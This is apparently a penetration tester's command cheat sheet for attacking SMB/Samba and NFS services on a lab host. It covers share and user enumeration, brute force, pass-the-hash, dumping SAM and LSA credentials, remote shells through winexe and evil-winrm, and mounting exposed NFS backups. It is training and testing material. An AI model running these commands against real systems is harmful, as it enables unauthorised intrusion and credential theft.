=================================== 
139/445 SMB Samba

sudo nmap -p 445 --script=smb-enum-shares,smb-enum-users 192.168.200.5 
sudo nmap --script=smb2-capabilities,smb-print-text,smb2-security-mode.nse,smb-protocols,smb2-time.nse,smb-psexec,smb2-vuln-uptime,smb-security-mode,smb-server-stats,smb-double-pulsar-backdoor,smb-system-info,smb-vuln-conficker,smb-enum-groups,smb-mbenum,smb-vuln-cve2009-3103,smb-enum-processes,smb-vuln-cve-2017-7494,smb-vuln-ms06-025,smb-enum-shares,smb-vuln-ms07-029,smb-enum-users,smb-vuln-ms08-067,smb-vuln-ms10-054,smb-ls,smb-vuln-ms10-061,smb-vuln-ms17-010,smb-os-discovery,smb-vuln-regsvc-dos  --script-args=unsafe=1 -T5 192.168.200.5 -p 445 | tee nmap-smb

=================================== 
enum4linux -a 192.168.200.5

=================================== 
smbmap -H 192.168.200.5
smbmap -H 192.168.200.5 -R --depth 5 
smbmap -H 192.168.200.5 -u '' -p '' 
smbmap -H 192.168.200.5 -u admin -p 'paxx' -d mike.com


=================================== 
smbclient -L 192.168.200.5 
smbclient -L 192.168.200.5 -p12445
smbclient -L //192.168.200.5  
smbclient -L //192.168.200.5/ -U "guest"

smbclient //192.168.200.5/share 
smbclient //192.168.200.5/share -U admin
smbclient \\\\192.168.200.5\\ipc$ -U admin
smbclient //192.168.200.5/secrets -U mike.com\\admin%paxxword
dir  
mask "" 
recurse ON  
prompt OFF 
mget *

=================================== 
Find Users

rpcclient 192.168.200.5 -U '' 
srvinfo
enumdomusers
getdompwinfo
querydominfo
netshareenum
netshareenumall


================================== 
crackmapexec --help 
crackmapexec smb 192.168.200.5
crackmapexec smb 192.168.200.5 --shares -u '' -p '' 
crackmapexec smb 192.168.200.5 --shares -u bob -p paxxword

crackmapexec winrm 192.168.200.5
crackmapexec winrm 192.168.200.5 -u bob -p 'paxxword' 

crackmapexec smb 192.168.200.5 --pass-pol 
crackmapexec smb 192.168.200.5 -u guest -p "" --shares 
crackmapexec smb 192.168.200.5 -u guest -p "" -M spider_plus 

crackmapexec smb 192.168.200.5 -d mydom -u users.txt -p pass.txt    ..brute too 
crackmapexec smb 192.168.200.5 10.0.0.1 10.1.1.2 -u bob -p 'paxxword' --local-auth 
crackmapexec smb 192.168.200.5 -u bob -p 'paxxword'    ..test password, get domain info 
crackmapexec smb 192.168.200.5 10.1.1.2 -u bob -p 'paxxword' -d mydomain 
crackmapexec smb 192.168.200.5 10.1.1.2 -u bob -H ntlmhash -d mydomain 

crackmapexec smb 192.168.200.5 -u bob -p 'paxxword' --shares 
crackmapexec smb 192.168.200.5 -d mydomain -u bob -H ntlmhash --sam 
crackmapexec smb 192.168.200.5 -d mydomain -u bob -H ntlmhash --lsa 


=================================== 
Samba Shell:
winexe -U username //192.168.200.5 "cmd.exe" --system
evil-winrm -i 192.168.200.5 -u bob -p paxxword

=================================== 
Reuse samba-creds for FTP
hydra -l steph -P $rockyou 192.168.200.5 ftp

=================================== 
NFS

showmount -e 192.168.200.5
mkdir /tmp/bu 
su mount -t nfs 192.168.200.5/backups /tmp/bu 
cd /tmp/bu 
find | tee ~/lab/nfslist.txt 
find | grep -i config 
